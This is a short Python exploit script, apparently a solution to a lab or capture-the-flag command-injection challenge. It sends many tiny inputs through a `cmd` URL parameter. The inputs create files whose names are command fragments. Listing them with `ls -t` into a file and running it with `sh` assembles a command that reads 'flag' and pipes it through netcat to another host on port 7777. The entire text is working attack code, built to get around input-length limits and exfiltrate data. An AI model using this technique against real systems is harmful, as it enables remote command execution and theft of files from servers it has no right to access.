#encoding:utf-8
import time
import requests
baseurl = "http://192.168.1.6:19080/class09/2/index.php?cmd="
s = requests.session()

list=[
    '>7777',
    '>1\%20\\',
    '>16\\',
    '>1.\\',
    '>168.\\',
    '>2.\\',
    '>19\\',
    '>c\%20\\',
    '>\|n\\',
    '>ag\\',
    '>fl\\',
    '>t\ \\',
    '>ca\\',
    'ls -t>a'
]

for i in list:
    time.sleep(1)
    url = baseurl+str(i)
    s.get(url)

s.get(baseurl+"sh a")
